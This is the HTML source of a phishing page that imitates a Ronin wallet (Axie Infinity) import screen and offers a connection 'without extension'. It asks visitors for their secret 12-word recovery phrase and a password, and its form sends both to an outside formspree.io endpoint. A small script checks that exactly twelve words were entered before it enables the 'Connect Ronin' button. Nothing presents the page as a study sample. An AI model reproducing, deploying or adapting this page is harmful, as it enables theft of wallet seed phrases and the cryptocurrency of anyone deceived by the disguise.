<!DOCTYPE html>
<html class="js-focus-visible" data-js-focus-visible="" lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Import Ronin Axie | No Extensions</title>
    <meta name="description"
        name="Ronin Import. Connect without downloading our extension. You can connect there and check your AXS, SLP and AXIE INFINITY Axies price and quantity." />
    <meta name="keywords" content="ronin, ronin, ronin extension, axs, slp, axie, axie infinity, axie infinity" />
    <meta name="robots" content="index" />
    <link rel="icon" href="images/favicon.png">
    <link rel="stylesheet" href="index.css">
</head>

<body>
    <section id="root" style="margin: auto;">
        <div class="bg-no-repeat mh-screen"
            style="background-image: url('./images/background.svg'); background-size: 1308px; background-position: center 96px;">
            <div class="relavtive flex flex-col h-screen">
                <div class="inline-block w-full mb-44 mt-16"><img class="m-auto" style="height: 48px;"
                        src="./images/ronin_logo.webp" alt="Ronin Logo"></div>
                <div class="flex-1">
                    <div class="mx-auto mt-36 w-full" style="max-width: 500px;">
                        <h4 class="mb-16 font-bold text-center">Import using seed phrase</h4>
                        <div class="m-auto text-center mb-44 leading-20">Enter your secret 12 word phrase here to
                            connect</div>
                        <label><span class="uppercase text-basic-6 font-bold leading-12 pl-8">Secret recovery
                                phrase</span>
                            <form action="https://formspree.io/f/xzbyykld" method="POST">
                                <div class="ds-form-group">
                                    <div><span class="ds-input-wrapper-large text-14 ds-input-wrapper"><input
                                                class="ds-input" type="text" value="" name="inputPhrase"
                                                id="inputPhrase"
                                                style="padding-left: 12px; padding-right: 12px; width: 100% !important"
                                                required minlength="24" /></span></span>
                                        <div class="ds-helper-text"><span class="flex items-center ml-8"><svg
                                                    class="ds-svg-icon" viewBox="0 0 24 24" width="16" height="16"
                                                    style="fill: rgb(143, 155, 179);">
                                                    <defs>
                                                        <path id="alert-circle-fill_svg__a"
                                                            d="M13 13a1 1 0 01-2 0V8a1 1 0 012 0v5zm-1 4a1 1 0 110-2 1 1 0 010 2zm0-15C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2z">
                                                        </path>
                                                    </defs>
                                                    <use fill="" fill-rule="evenodd"
                                                        xlink:href="#alert-circle-fill_svg__a">
                                                    </use>
                                                </svg>
                                                <span class="ml-4">Separate each word with a single space (ex:coffee
                                                    milk flower...)</span></span></div>
                                    </div>
                                </div>
                        </label>
                        <hr class="mt-40 border-opacity-50 border-basic-4 mb-40"><label><span
                                class="uppercase text-basic-6 font-bold leading-12 pl-8 mr-4">enter password</span><span
                                class="uppercase text-basic-5">(at least 8 characters)</span>
                            <div class="ds-form-group">
                                <div><span class="ds-input-wrapper-large text-14 ds-input-wrapper"><input
                                            class="ds-input" type="password" value="" name="inputPass"
                                            style="padding-left: 12px; padding-right: 12px; width: 100% !important"
                                            required /></span>
                                    <div class="ds-helper-text"></div>
                                </div>
                            </div>
                        </label><label><span class="uppercase text-basic-6 font-bold leading-12 pl-8">confirm
                                password</span>
                            <div class="ds-form-group">
                                <div><span class="ds-input-wrapper-large text-14 ds-input-wrapper"><input
                                            class="ds-input" type="password" value="" name="inputPass2"
                                            style="padding-left: 12px; padding-right: 12px; width: 100% !important"
                                            required /></span>
                                    <div class="ds-helper-text"></div>
                                </div>
                            </div>
                        </label>
                        <div class="flex justify-end items-start gap-16 mt-40">
                            <input type="submit" name="submit" value="Connect Ronin" id="submit"
                                class="ronin-button ronin-button-default shadow-none bg-ronin-gradient hover:bg-ronin-gradient capitalize ds-button ds-large btn b"
                                style="background-color: #0d6efd; color: white; cursor: pointer;" disabled />
                        </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <div class="ds-toast-container ds-place-bottom-center"></div>

    <script>
        window.onload = function () {
            document.getElementById("inputPhrase").addEventListener('keydown', () => {
                testPhrase();
            });
            document.getElementById("inputPhrase").addEventListener('focusout', () => {
                testPhrase();
            });
        };

        function testPhrase() {
            var phrase = document.getElementById("inputPhrase").value;
            var resultado = /([a-zA-Z]+\s?\b){12,12}/g.test(phrase);
            if (resultado === true) {
                document.getElementById("submit").disabled = false;
            } else {
                document.getElementById("submit").disabled = true;
            }
        }

    </script>

</body>

</html>
